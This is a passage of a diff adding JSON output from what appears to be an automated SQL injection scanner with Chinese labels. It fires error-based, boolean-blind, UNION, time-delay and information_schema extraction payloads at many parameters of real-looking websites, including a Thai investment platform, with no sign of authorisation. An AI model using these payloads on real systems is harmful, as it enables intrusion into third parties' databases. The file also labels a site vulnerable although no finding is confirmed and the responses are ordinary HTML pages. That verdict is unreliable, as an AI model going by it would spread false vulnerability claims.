+          "payload": "1' AND 'a'='a",
+          "sqlmap_confirmed": false
+        },
+        {
+          "type": "错误注入",
+          "parameter": "product",
+          "payload": "1' AND 'a'='b",
+          "response_snippet": "<!DOCTYPE html>\n<!--[if lt IE 7]>      <html class=\"no-js lt-ie9 lt-ie8 lt-ie7\"> <![endif]-->\n<!--[i",
+          "sqlmap_confirmed": false
+        },
+        {
+          "type": "布尔盲注",
+          "parameter": "product",
+          "payload": "1' AND 'a'='b",
+          "sqlmap_confirmed": false
+        }
+      ],
+      "confirmed_count": 0,
+      "status": "有漏洞"
+    },
+    "https://fundingsocieties.co.th": {
+      "vulnerabilities": [
+        {
+          "type": "错误注入",
+          "parameter": "id",
+          "payload": "1' OR '1'='1",
+          "response_snippet": "<!doctype html><html lang=\"th\"><head>\n    <meta charset=\"utf-8\">\n    <title>แพลตฟอร์มการลงทุนโดยบริษ",
+          "sqlmap_confirmed": false
+        },
+        {
+          "type": "布尔盲注",
+          "parameter": "id",
+          "payload": "1' OR '1'='1",
+          "sqlmap_confirmed": false
+        },
+        {
+          "type": "错误注入",
+          "parameter": "id",
+          "payload": "1' UNION SELECT 1,2,3-- ",
+          "response_snippet": "<!DOCTYPE html>\n<!--[if lt IE 7]> <html class=\"no-js ie6 oldie\" lang=\"en-US\"> <![endif]-->\n<!--[if I",
+          "sqlmap_confirmed": false
+        },
+        {
+          "type": "布尔盲注",
+          "parameter": "id",
+          "payload": "1' UNION SELECT 1,2,3-- ",
+          "sqlmap_confirmed": false
+        },
+        {
+          "type": "错误注入",
+          "parameter": "id",
+          "payload": "1' AND 1=1-- ",
+          "response_snippet": "<!DOCTYPE html>\n<!--[if lt IE 7]> <html class=\"no-js ie6 oldie\" lang=\"en-US\"> <![endif]-->\n<!--[if I",
+          "sqlmap_confirmed": false
+        },
+        {
+          "type": "布尔盲注",
+          "parameter": "id",
+          "payload": "1' AND 1=1-- ",
+          "sqlmap_confirmed": false
+        },
+        {
+          "type": "错误注入",
+          "parameter": "id",
+          "payload": "1' AND 1=2-- ",
+          "response_snippet": "<!DOCTYPE html>\n<!--[if lt IE 7]> <html class=\"no-js ie6 oldie\" lang=\"en-US\"> <![endif]-->\n<!--[if I",
+          "sqlmap_confirmed": false
+        },
+        {
+          "type": "布尔盲注",
+          "parameter": "id",
+          "payload": "1' AND 1=2-- ",
+          "sqlmap_confirmed": false
+        },
+        {
+          "type": "错误注入",
+          "parameter": "id",
+          "payload": "1' AND SLEEP(5)-- ",
+          "response_snippet": "<!DOCTYPE html>\n<!--[if lt IE 7]> <html class=\"no-js ie6 oldie\" lang=\"en-US\"> <![endif]-->\n<!--[if I",
+          "sqlmap_confirmed": false
+        },
+        {
+          "type": "布尔盲注",
+          "parameter": "id",
+          "payload": "1' AND SLEEP(5)-- ",
+          "sqlmap_confirmed": false
+        },
+        {
+          "type": "错误注入",
+          "parameter": "id",
+          "payload": "1' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT(version(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)-- ",
+          "response_snippet": "<!DOCTYPE html>\n<!--[if lt IE 7]> <html class=\"no-js ie6 oldie\" lang=\"en-US\"> <![endif]-->\n<!--[if I",
+          "sqlmap_confirmed": false
+        },
+        {
+          "type": "布尔盲注",
+          "parameter": "id",
+          "payload": "1' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT(version(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)-- ",
+          "sqlmap_confirmed": false
+        },
+        {
+          "type": "错误注入",
+          "parameter": "id",
+          "payload": "1' AND 'a'='a",
+          "response_snippet": "<!doctype html><html lang=\"th\"><head>\n    <meta charset=\"utf-8\">\n    <title>แพลตฟอร์มการลงทุนโดยบริษ",
+          "sqlmap_confirmed": false
+        },
+        {
+          "type": "布尔盲注",
+          "parameter": "id",
+          "payload": "1' AND 'a'='a",
+          "sqlmap_confirmed": false
+        },
+        {
+          "type": "错误注入",
+          "parameter": "id",
+          "payload": "1' AND 'a'='b",
+          "response_snippet": "<!doctype html><html lang=\"th\"><head>\n    <meta charset=\"utf-8\">\n    <title>แพลตฟอร์มการลงทุนโดยบริษ",
+          "sqlmap_confirmed": false
+        },
+        {
+          "type": "布尔盲注",
+          "parameter": "id",
+          "payload": "1' AND 'a'='b",
+          "sqlmap_confirmed": false
+        },
+        {
+          "type": "错误注入",
+          "parameter": "page",
+          "payload": "1' OR '1'='1",
+          "response_snippet": "<!doctype html><html lang=\"th\"><head>\n    <meta charset=\"utf-8\">\n    <title>แพลตฟอร์มการลงทุนโดยบริษ",
+          "sqlmap_confirmed": false
+        },
+        {
+          "type": "布尔盲注",
+          "parameter": "page",
+          "payload": "1' OR '1'='1",
+          "sqlmap_confirmed": false
+        },
+        {
+          "type": "错误注入",
+          "parameter": "page",
+          "payload": "1' UNION SELECT 1,2,3-- ",
+          "response_snippet": "<!DOCTYPE html>\n<!--[if lt IE 7]> <html class=\"no-js ie6 oldie\" lang=\"en-US\"> <![endif]-->\n<!--[if I",
+          "sqlmap_confirmed": false
+        },
+        {
+          "type": "布尔盲注",
+          "parameter": "page",
+          "payload": "1' UNION SELECT 1,2,3-- ",
+          "sqlmap_confirmed": false
+        },
+        {
+          "type": "错误注入",
+          "parameter": "page",
+          "payload": "1' AND 1=1-- ",
+          "response_snippet": "<!DOCTYPE html>\n<!--[if lt IE 7]> <html class=\"no-js ie6 oldie\" lang=\"en-US\"> <![endif]-->\n<!--[if I",
+          "sqlmap_confirmed": false
+        },
+        {
+          "type": "布尔盲注",
+          "parameter": "page",
+          "payload": "1' AND 1=1-- ",
+          "sqlmap_confirmed": false
+        },
+        {
+          "type": "错误注入",
+          "parameter": "page",
+          "payload": "1' AND 1=2-- ",
+          "response_snippet": "<!DOCTYPE html>\n<!--[if lt IE 7]> <html class=\"no-js ie6 oldie\" lang=\"en-US\"> <![endif]-->\n<!--[if I",
+          "sqlmap_confirmed": false
+        },
+        {
+          "type": "布尔盲注",
+          "parameter": "page",
+          "payload": "1' AND 1=2-- ",
+          "sqlmap_confirmed": false
+        },
+        {
+          "type": "错误注入",
+          "parameter": "page",
+          "payload": "1' AND SLEEP(5)-- ",
+          "response_snippet": "<!DOCTYPE html>\n<!--[if lt IE 7]> <html class=\"no-js ie6 oldie\" lang=\"en-US\"> <![endif]-->\n<!--[if I",
+          "sqlmap_confirmed": false
+        },
+        {
+          "type": "布尔盲注",
+          "parameter": "page",
+          "payload": "1' AND SLEEP(5)-- ",
+          "sqlmap_confirmed": false
+        },
+        {
+          "type": "错误注入",
+          "parameter": "page",
+          "payload": "1' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT(version(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)-- ",
+          "response_snippet": "<!DOCTYPE html>\n<!--[if lt IE 7]> <html class=\"no-js ie6 oldie\" lang=\"en-US\"> <![endif]-->\n<!--[if I",
+          "sqlmap_confirmed": false
+        },
+        {
+          "type": "布尔盲注",
+          "parameter": "page",
+          "payload": "1' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT(version(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)-- ",
+          "sqlmap_confirmed": false
+        },
+        {
+          "type": "错误注入",
+          "parameter": "page",
+          "payload": "1' AND 'a'='a",
+          "response_snippet": "<!doctype html><html lang=\"th\"><head>\n    <meta charset=\"utf-8\">\n    <title>แพลตฟอร์มการลงทุนโดยบริษ",
+          "sqlmap_confirmed": false
+        },
+        {
+          "type": "布尔盲注",
+          "parameter": "page",
+          "payload": "1' AND 'a'='a",
+          "sqlmap_confirmed": false
+        },
+        {
+          "type": "错误注入",
+          "parameter": "page",
+          "payload": "1' AND 'a'='b",
+          "response_snippet": "<!doctype html><html lang=\"th\"><head>\n    <meta charset=\"utf-8\">\n    <title>แพลตฟอร์มการลงทุนโดยบริษ",
+          "sqlmap_confirmed": false
+        },
+        {
+          "type": "布尔盲注",
+          "parameter": "page",
+          "payload": "1' AND 'a'='b",
+          "sqlmap_confirmed": false
+        },
+        {
+          "type": "错误注入",
+          "parameter": "search",
+          "payload": "1' OR '1'='1",
+          "response_snippet": "<!doctype html><html lang=\"th\"><head>\n    <meta charset=\"utf-8\">\n    <title>แพลตฟอร์มการลงทุนโดยบริษ",
+          "sqlmap_confirmed": false
+        },
+        {
+          "type": "布尔盲注",
+          "parameter": "search",
+          "payload": "1' OR '1'='1",
+          "sqlmap_confirmed": false
+        },
+        {
+          "type": "错误注入",
+          "parameter": "search",
+          "payload": "1' UNION SELECT 1,2,3-- ",
+          "response_snippet": "<!DOCTYPE html>\n<!--[if lt IE 7]> <html class=\"no-js ie6 oldie\" lang=\"en-US\"> <![endif]-->\n<!--[if I",
+          "sqlmap_confirmed": false
+        },
+        {
+          "type": "布尔盲注",
+          "parameter": "search",
+          "payload": "1' UNION SELECT 1,2,3-- ",
+          "sqlmap_confirmed": false
+        },
+        {
+          "type": "错误注入",
+          "parameter": "search",
+          "payload": "1' AND 1=1-- ",
+          "response_snippet": "<!DOCTYPE html>\n<!--[if lt IE 7]> <html class=\"no-js ie6 oldie\" lang=\"en-US\"> <![endif]-->\n<!--[if I",
+          "sqlmap_confirmed": false
+        },
+        {
+          "type": "布尔盲注",
+          "parameter": "search",
+          "payload": "1' AND 1=1-- ",
+          "sqlmap_confirmed": false
+        },
+        {
+          "type": "错误注入",
+          "parameter": "search",
+          "payload": "1' AND 1=2-- ",
+          "response_snippet": "<!DOCTYPE html>\n<!--[if lt IE 7]> <html class=\"no-js ie6 oldie\" lang=\"en-US\"> <![endif]-->\n<!--[if I",
+          "sqlmap_confirmed": false
+        },
+        {
+          "type": "布尔盲注",
+          "parameter": "search",
+          "payload": "1' AND 1=2-- ",
+          "sqlmap_confirmed": false
+        },
+        {
+          "type": "错误注入",
+          "parameter": "search",
+          "payload": "1' AND SLEEP(5)-- ",
+          "response_snippet": "<!DOCTYPE html>\n<!--[if lt IE 7]> <html class=\"no-js ie6 oldie\" lang=\"en-US\"> <![endif]-->\n<!--[if I",
+          "sqlmap_confirmed": false
+        },
+        {
+          "type": "布尔盲注",
+          "parameter": "search",
+          "payload": "1' AND SLEEP(5)-- ",
+          "sqlmap_confirmed": false
+        },
+        {
+          "type": "错误注入",
+          "parameter": "search",
+          "payload": "1' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT(version(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)-- ",
+          "response_snippet": "<!DOCTYPE html>\n<!--[if lt IE 7]> <html class=\"no-js ie6 oldie\" lang=\"en-US\"> <![endif]-->\n<!--[if I",
+          "sqlmap_confirmed": false
+        },
+        {
+          "type": "布尔盲注",
+          "parameter": "search",
+          "payload": "1' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT(version(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)-- ",
+          "sqlmap_confirmed": false
+        },
+        {
+          "type": "错误注入",
+          "parameter": "search",
+          "payload": "1' AND 'a'='a",
+          "response_snippet": "<!doctype html><html lang=\"th\"><head>\n    <meta charset=\"utf-8\">\n    <title>แพลตฟอร์มการลงทุนโดยบริษ",
+          "sqlmap_confirmed": false
+        },
+        {
+          "type": "布尔盲注",
+          "parameter": "search",
+          "payload": "1' AND 'a'='a",
+          "sqlmap_confirmed": false
+        },
+        {
+          "type": "错误注入",
+          "parameter": "search",
+          "payload": "1' AND 'a'='b",
+          "response_snippet": "<!doctype html><html lang=\"th\"><head>\n    <meta charset=\"utf-8\">\n    <title>แพลตฟอร์มการลงทุนโดยบริษ",
+          "sqlmap_confirmed": false
+        },
+        {
+          "type": "布尔盲注",
+          "parameter": "search",
+          "payload": "1' AND 'a'='b",
+          "sqlmap_confirmed": false
+        },
+        {
+          "type": "错误注入",
+          "parameter": "q",
+          "payload": "1' OR '1'='1",
+          "response_snippet": "<!doctype html><html lang=\"th\"><head>\n    <meta charset=\"utf-8\">\n    <title>แพลตฟอร์มการลงทุนโดยบริษ",
+          "sqlmap_confirmed": false
+        },
+        {
+          "type": "布尔盲注",
+          "parameter": "q",
+          "payload": "1' OR '1'='1",
+          "sqlmap_confirmed": false
+        },
+        {
+          "type": "错误注入",
+          "parameter": "q",
+          "payload": "1' UNION SELECT 1,2,3-- ",
+          "response_snippet": "<!DOCTYPE html>\n<!--[if lt IE 7]> <html class=\"no-js ie6 oldie\" lang=\"en-US\"> <![endif]-->\n<!--[if I",
+          "sqlmap_confirmed": false
+        },
+        {
+          "type": "布尔盲注",
+          "parameter": "q",
+          "payload": "1' UNION SELECT 1,2,3-- ",
+          "sqlmap_confirmed": false
+        },
+        {
+          "type": "错误注入",
+          "parameter": "q",
+          "payload": "1' AND 1=1-- ",
+          "response_snippet": "<!DOCTYPE html>\n<!--[if lt IE 7]> <html class=\"no-js ie6 oldie\" lang=\"en-US\"> <![endif]-->\n<!--[if I",
+          "sqlmap_confirmed": false
+        },
+        {
+          "type": "布尔盲注",
+          "parameter": "q",
+          "payload": "1' AND 1=1-- ",
+          "sqlmap_confirmed": false
+        },
+        {
+          "type": "错误注入",
+          "parameter": "q",
+          "payload": "1' AND 1=2-- ",
+          "response_snippet": "<!DOCTYPE html>\n<!--[if lt IE 7]> <html class=\"no-js ie6 oldie\" lang=\"en-US\"> <![endif]-->\n<!--[if I",
+          "sqlmap_confirmed": false
+        },
+        {
+          "type": "布尔盲注",
+          "parameter": "q",
+          "payload": "1' AND 1=2-- ",
+          "sqlmap_confirmed": false
+        },
+        {
+          "type": "错误注入",
+          "parameter": "q",
+          "payload": "1' AND SLEEP(5)-- ",
+          "response_snippet": "<!DOCTYPE html>\n<!--[if lt IE 7]> <html class=\"no-js ie6 oldie\" lang=\"en-US\"> <![endif]-->\n<!--[if I",
+          "sqlmap_confirmed": false
+        },
+        {
+          "type": "布尔盲注",
+          "parameter": "q",
+          "payload": "1' AND SLEEP(5)-- ",
+          "sqlmap_confirmed": false
+        },
+        {
+          "type": "错误注入",
+          "parameter": "q",
+          "payload": "1' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT(version(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)-- ",
+          "response_snippet": "<!DOCTYPE html>\n<!--[if lt IE 7]> <html class=\"no-js ie6 oldie\" lang=\"en-US\"> <![endif]-->\n<!--[if I",
+          "sqlmap_confirmed": false
+        },
+        {
+          "type": "布尔盲注",
+          "parameter": "q",
+          "payload": "1' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT(version(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)-- ",
+          "sqlmap_confirmed": false
+        },
+        {
+          "type": "错误注入",
+          "parameter": "q",
+          "payload": "1' AND 'a'='a",
+          "response_snippet": "<!doctype html><html lang=\"th\"><head>\n    <meta charset=\"utf-8\">\n    <title>แพลตฟอร์มการลงทุนโดยบริษ",
+          "sqlmap_confirmed": false
+        },
+        {
+          "type": "布尔盲注",
+          "parameter": "q",
+          "payload": "1' AND 'a'='a",
+          "sqlmap_confirmed": false
+        },
+        {
+          "type": "错误注入",
+          "parameter": "q",
+          "payload": "1' AND 'a'='b",
+          "response_snippet": "<!doctype html><html lang=\"th\"><head>\n    <meta charset=\"utf-8\">\n    <title>แพลตฟอร์มการลงทุนโดยบริษ",
+          "sqlmap_confirmed": false
+        },
+        {
+          "type": "布尔盲注",
+          "parameter": "q",
+          "payload": "1' AND 'a'='b",
+          "sqlmap_confirmed": false
+        },
+        {
+          "type": "错误注入",
+          "parameter": "query",
+          "payload": "1' OR '1'='1",
+          "response_snippet": "<!doctype html><html lang=\"th\"><head>\n    <meta charset=\"utf-8\">\n    <title>แพลตฟอร์มการลงทุนโดยบริษ",
+          "sqlmap_confirmed": false
+        },
+        {
+          "type": "布尔盲注",
+          "parameter": "query",
+          "payload": "1' OR '1'='1",
+          "sqlmap_confirmed": false
+        },
+        {
+          "type": "错误注入",
+          "parameter": "query",
+          "payload": "1' UNION SELECT 1,2,3-- ",
+          "response_snippet": "<!DOCTYPE html>\n<!--[if lt IE 7]> <html class=\"no-js ie6 oldie\" lang=\"en-US\"> <![endif]-->\n<!--[if I",
+          "sqlmap_confirmed": false
+        },
+        {
+          "type": "布尔盲注",
+          "parameter": "query",
+          "payload": "1' UNION SELECT 1,2,3-- ",
+          "sqlmap_confirmed": false
+        },
+        {
+          "type": "错误注入",
+          "parameter": "query",
+          "payload": "1' AND 1=1-- ",
+          "response_snippet": "<!DOCTYPE html>\n<!--[if lt IE 7]> <html class=\"no-js ie6 oldie\" lang=\"en-US\"> <![endif]-->\n<!--[if I",
+          "sqlmap_confirmed": false
+        },
+        {
+          "type": "布尔盲注",
+          "parameter": "query",
+          "payload": "1' AND 1=1-- ",
+          "sqlmap_confirmed": false
+        },
+        {
+          "type": "错误注入",
+          "parameter": "query",
+          "payload": "1' AND 1=2-- ",
+          "response_snippet": "<!DOCTYPE html>\n<!--[if lt IE 7]> <html class=\"no-js ie6 oldie\" lang=\"en-US\"> <![endif]-->\n<!--[if I",
+          "sqlmap_confirmed": false
+        },
+        {
+          "type": "布尔盲注",
+          "parameter": "query",
+          "payload": "1' AND 1=2-- ",
+          "sqlmap_confirmed": false
+        },
+        {
+          "type": "错误注入",
+          "parameter": "query",
+          "payload": "1' AND SLEEP(5)-- ",
+          "response_snippet": "<!DOCTYPE html>\n<!--[if lt IE 7]> <html class=\"no-js ie6 oldie\" lang=\"en-US\"> <![endif]-->\n<!--[if I",
+          "sqlmap_confirmed": false
+        },
+        {
+          "type": "布尔盲注",
+          "parameter": "query",
+          "payload": "1' AND SLEEP(5)-- ",
+          "sqlmap_confirmed": false
+        },
+        {
+          "type": "错误注入",
+          "parameter": "query",
+          "payload": "1' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT(version(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)-- ",
+          "response_snippet": "<!DOCTYPE html>\n<!--[if lt IE 7]> <html class=\"no-js ie6 oldie\" lang=\"en-US\"> <![endif]-->\n<!--[if I",
+          "sqlmap_confirmed": false
+        },
+        {
+          "type": "布尔盲注",
+          "parameter": "query",
+          "payload": "1' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT(version(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)-- ",
+          "sqlmap_confirmed": false
+        },
+        {
+          "type": "错误注入",
+          "parameter": "query",
+          "payload": "1' AND 'a'='a",
+          "response_snippet": "<!doctype html><html lang=\"th\"><head>\n    <meta charset=\"utf-8\">\n    <title>แพลตฟอร์มการลงทุนโดยบริษ",
+          "sqlmap_confirmed": false
+        },
+        {
+          "type": "布尔盲注",
+          "parameter": "query",
+          "payload": "1' AND 'a'='a",
+          "sqlmap_confirmed": false
+        },
+        {
+          "type": "错误注入",
+          "parameter": "query",
+          "payload": "1' AND 'a'='b",
+          "response_snippet": "<!doctype html><html lang=\"th\"><head>\n    <meta charset=\"utf-8\">\n    <title>แพลตฟอร์มการลงทุนโดยบริษ",
+          "sqlmap_confirmed": false
+        },
+        {
+          "type": "布尔盲注",
+          "parameter": "query",
+          "payload": "1' AND 'a'='b",
+          "sqlmap_confirmed": false
+        },
+        {
+          "type": "错误注入",
+          "parameter": "user",
+          "payload": "1' OR '1'='1",
+          "response_snippet": "<!doctype html><html lang=\"th\"><head>\n    <meta charset=\"utf-8\">\n    <title>แพลตฟอร์มการลงทุนโดยบริษ",
+          "sqlmap_confirmed": false
+        },
+        {
+          "type": "布尔盲注",
+          "parameter": "user",
+          "payload": "1' OR '1'='1",
+          "sqlmap_confirmed": false
+        },
+        {
+          "type": "错误注入",
+          "parameter": "user",
+          "payload": "1' UNION SELECT 1,2,3-- ",
+          "response_snippet": "<!DOCTYPE html>\n<!--[if lt IE 7]> <html class=\"no-js ie6 oldie\" lang=\"en-US\"> <![endif]-->\n<!--[if I",
+          "sqlmap_confirmed": false
+        },
+        {
+          "type": "布尔盲注",
+          "parameter": "user",
+          "payload": "1' UNION SELECT 1,2,3-- ",
+          "sqlmap_confirmed": false
+        },
+        {
+          "type": "错误注入",
+          "parameter": "user",
+          "payload": "1' AND 1=1-- ",
+          "response_snippet": "<!DOCTYPE html>\n<!--[if lt IE 7]> <html class=\"no-js ie6 oldie\" lang=\"en-US\"> <![endif]-->\n<!--[if I",
+          "sqlmap_confirmed": false
+        },
+        {
+          "type": "布尔盲注",
+          "parameter": "user",
+          "payload": "1' AND 1=1-- ",
+          "sqlmap_confirmed": false
+        },
+        {
+          "type": "错误注入",
+          "parameter": "user",
+          "payload": "1' AND 1=2-- ",
+          "response_snippet": "<!DOCTYPE html>\n<!--[if lt IE 7]> <html class=\"no-js ie6 oldie\" lang=\"en-US\"> <![endif]-->\n<!--[if I",
+          "sqlmap_confirmed": false
+        },
+        {
+          "type": "布尔盲注",
+          "parameter": "user",
+          "payload": "1' AND 1=2-- ",
+          "sqlmap_confirmed": false
+        },
+        {
+          "type": "错误注入",
+          "parameter": "user",
+          "payload": "1' AND SLEEP(5)-- ",
+          "response_snippet": "<!DOCTYPE html>\n<!--[if lt IE 7]> <html class=\"no-js ie6 oldie\" lang=\"en-US\"> <![endif]-->\n<!--[if I",
+          "sqlmap_confirmed": false
+        },
+        {
+          "type": "布尔盲注",
+          "parameter": "user",
+          "payload": "1' AND SLEEP(5)-- ",
+          "sqlmap_confirmed": false
+        },
+        {
+          "type": "错误注入",
+          "parameter": "user",
+          "payload": "1' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT(version(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)-- ",
+          "response_snippet": "<!DOCTYPE html>\n<!--[if lt IE 7]> <html class=\"no-js ie6 oldie\" lang=\"en-US\"> <![endif]-->\n<!--[if I",
+          "sqlmap_confirmed": false
+        },
+        {
+          "type": "布尔盲注",
+          "parameter": "user",
+          "payload": "1' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT(version(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)-- ",
+          "sqlmap_confirmed": false
+        },
+        {
+          "type": "错误注入",
+          "parameter": "user",
+          "payload": "1' AND 'a'='a",
+          "response_snippet": "<!doctype html><html lang=\"th\"><head>\n    <meta charset=\"utf-8\">\n    <title>แพลตฟอร์มการลงทุนโดยบริษ",
+          "sqlmap_confirmed": false
+        },
+        {
+          "type": "布尔盲注",
+          "parameter": "user",
+          "payload": "1' AND 'a'='a",
+          "sqlmap_confirmed": false
+        },
+        {
+          "type": "错误注入",
+          "parameter": "user",
+          "payload": "1' AND 'a'='b",
+          "response_snippet": "<!doctype html><html lang=\"th\"><head>\n    <meta charset=\"utf-8\">\n    <title>แพลตฟอร์มการลงทุนโดยบริษ",
+          "sqlmap_confirmed": false
+        },
+        {
+          "type": "布尔盲注",
+          "parameter": "user",
+          "payload": "1' AND 'a'='b",
+          "sqlmap_confirmed": false
+        },
+        {
+          "type": "错误注入",
+          "parameter": "category",
+          "payload": "1' OR '1'='1",
+          "response_snippet": "<!doctype html><html lang=\"th\"><head>\n    <meta charset=\"utf-8\">\n    <title>แพลตฟอร์มการลงทุนโดยบริษ",
+          "sqlmap_confirmed": false
+        },
+        {
+          "type": "布尔盲注",
+          "parameter": "category",
+          "payload": "1' OR '1'='1",
+          "sqlmap_confirmed": false
+        },
+        {
+          "type": "错误注入",
+          "parameter": "category",
+          "payload": "1' UNION SELECT 1,2,3-- ",
+          "response_snippet": "<!DOCTYPE html>\n<!--[if lt IE 7]> <html class=\"no-js ie6 oldie\" lang=\"en-US\"> <![endif]-->\n<!--[if I",
+          "sqlmap_confirmed": false
+        },
+        {
+          "type": "布尔盲注",
+          "parameter": "category",
+          "payload": "1' UNION SELECT 1,2,3-- ",
+          "sqlmap_confirmed": false
+        },
+        {
+          "type": "错误注入",
+          "parameter": "category",
+          "payload": "1' AND 1=1-- ",
+          "response_snippet": "<!DOCTYPE html>\n<!--[if lt IE 7]> <html class=\"no-js ie6 oldie\" lang=\"en-US\"> <![endif]-->\n<!--[if I",
+          "sqlmap_confirmed": false
+        },
+        {
+          "type": "布尔盲注",
+          "parameter": "category",
+          "payload": "1' AND 1=1-- ",
+          "sqlmap_confirmed": false
+        },
+        {
+          "type": "错误注入",
+          "parameter": "category",
+          "payload": "1' AND 1=2-- ",
+          "response_snippet": "<!DOCTYPE html>\n<!--[if lt IE 7]> <html class=\"no-js ie6 oldie\" lang=\"en-US\"> <![endif]-->\n<!--[if I",
+          "sqlmap_confirmed": false
+        },
+        {
+          "type": "布尔盲注",
+          "parameter": "category",
+          "payload": "1' AND 1=2-- ",
+          "sqlmap_confirmed": false
+        },
+        {
+          "type": "错误注入",
+          "parameter": "category",
+          "payload": "1' AND SLEEP(5)-- ",
+          "response_snippet": "<!DOCTYPE html>\n<!--[if lt IE 7]> <html class=\"no-js ie6 oldie\" lang=\"en-US\"> <![endif]-->\n<!--[if I",
+          "sqlmap_confirmed": false
+        },
+        {
+          "type": "布尔盲注",
+          "parameter": "category",
+          "payload": "1' AND SLEEP(5)-- ",
+          "sqlmap_confirmed": false
+        },
+        {
+          "type": "错误注入",
+          "parameter": "category",
+          "payload": "1' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT(version(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)-- ",
+          "response_snippet": "<!DOCTYPE html>\n<!--[if lt IE 7]> <html class=\"no-js ie6 oldie\" lang=\"en-US\"> <![endif]-->\n<!--[if I",
+          "sqlmap_confirmed": false
+        },
+        {
+          "type": "布尔盲注",
+          "parameter": "category",
+          "payload": "1' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT(version(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)-- ",
+          "sqlmap_confirmed": false
+        },
+        {
+          "type": "错误注入",
+          "parameter": "category",
+          "payload": "1' AND 'a'='a",
+          "response_snippet": "<!doctype html><html lang=\"th\"><head>\n    <meta charset=\"utf-8\">\n    <title>แพลตฟอร์มการลงทุนโดยบริษ",
+          "sqlmap_confirmed": false
+        },
+        {
+          "type": "布尔盲注",
+          "parameter": "category",
+          "payload": "1' AND 'a'='a",
+          "sqlmap_confirmed": false
+        },
+        {
+          "type": "错误注入",
+          "parameter": "category",
+          "payload": "1' AND 'a'='b",
+          "response_snippet": "<!doctype html><html lang=\"th\"><head>\n    <meta charset=\"utf-8\">\n    <title>แพลตฟอร์มการลงทุนโดยบริษ",
+          "sqlmap_confirmed": false
+        },
+        {
+          "type": "布尔盲注",
+          "parameter": "category",
+          "payload": "1' AND 'a'='b",
+          "sqlmap_confirmed": false
+        },
+        {
+          "type": "错误注入",
+          "parameter": "product",
+          "payload": "1' OR '1'='1",
+          "response_snippet": "<!doctype html><html lang=\"th\"><head>\n    <meta charset=\"utf-8\">\n    <title>แพลตฟอร์มการลงทุนโดยบริษ",
+          "sqlmap_confirmed": false
+        },
+        {
+          "type": "布尔盲注",
+          "parameter": "product",
+          "payload": "1' OR '1'='1",
+          "sqlmap_confirmed": false
+        },
+        {
+          "type": "错误注入",
+          "parameter": "product",
+          "payload": "1' UNION SELECT 1,2,3-- ",
+          "response_snippet": "<!DOCTYPE html>\n<!--[if lt IE 7]> <html class=\"no-js ie6 oldie\" lang=\"en-US\"> <![endif]-->\n<!--[if I",
+          "sqlmap_confirmed": false
+        },
+        {
+          "type": "布尔盲注",
+          "parameter": "product",
+          "payload": "1' UNION SELECT 1,2,3-- ",
+          "sqlmap_confirmed": false
+        },
+        {
+          "type": "错误注入",
+          "parameter": "product",
+          "payload": "1' AND 1=1-- ",
+          "response_snippet": "<!DOCTYPE html>\n<!--[if lt IE 7]> <html class=\"no-js ie6 oldie\" lang=\"en-US\"> <![endif]-->\n<!--[if I",
+          "sqlmap_confirmed": false
+        },
+        {
+          "type": "布尔盲注",
+          "parameter": "product",
+          "payload": "1' AND 1=1-- ",
+          "sqlmap_confirmed": false
+        },
+        {
+          "type": "错误注入",
+          "parameter": "product",
+          "payload": "1' AND 1=2-- ",
+          "response_snippet": "<!DOCTYPE html>\n<!--[if lt IE 7]> <html class=\"no-js ie6 oldie\" lang=\"en-US\"> <![endif]-->\n<!--[if I",
+          "sqlmap_confirmed": false
+        },
+        {
+          "type": "布尔盲注",
+          "parameter": "product",
+          "payload": "1' AND 1=2-- ",
+          "sqlmap_confirmed": false
+        },
+        {
+          "type": "错误注入",
+          "parameter": "product",
+          "payload": "1' AND SLEEP(5)-- ",
+          "response_snippet": "<!DOCTYPE html>\n<!--[if lt IE 7]> <html class=\"no-js ie6 oldie\" lang=\"en-US\"> <![endif]-->\n<!--[if I",
+          "sqlmap_confirmed": false
+        },
+        {
+          "type": "布尔盲注",
+          "parameter": "product",
+          "payload": "1' AND SLEEP(5)-- ",
+          "sqlmap_confirmed": false
+        },
+        {
+          "type": "错误注入",
+          "parameter": "product",
+          "payload": "1' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT(version(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)-- ",
+          "response_snippet": "<!DOCTYPE html>\n<!--[if lt IE 7]> <html class=\"no-js ie6 oldie\" lang=\"en-US\"> <![endif]-->\n<!--[if I",
+          "sqlmap_confirmed": false
+        },
+        {
+          "type": "布尔盲注",
+          "parameter": "product",
+          "payload": "1' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT(version(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)-- ",
+          "sqlmap_confirmed": false
+        },
+        {
+          "type": "错误注入",
+          "parameter": "product",
+          "payload": "1' AND 'a'='a",
+          "response_snippet": "<!doctype html><html lang=\"th\"><head>\n    <meta charset=\"utf-8\">\n    <title>แพลตฟอร์มการลงทุนโดยบริษ",
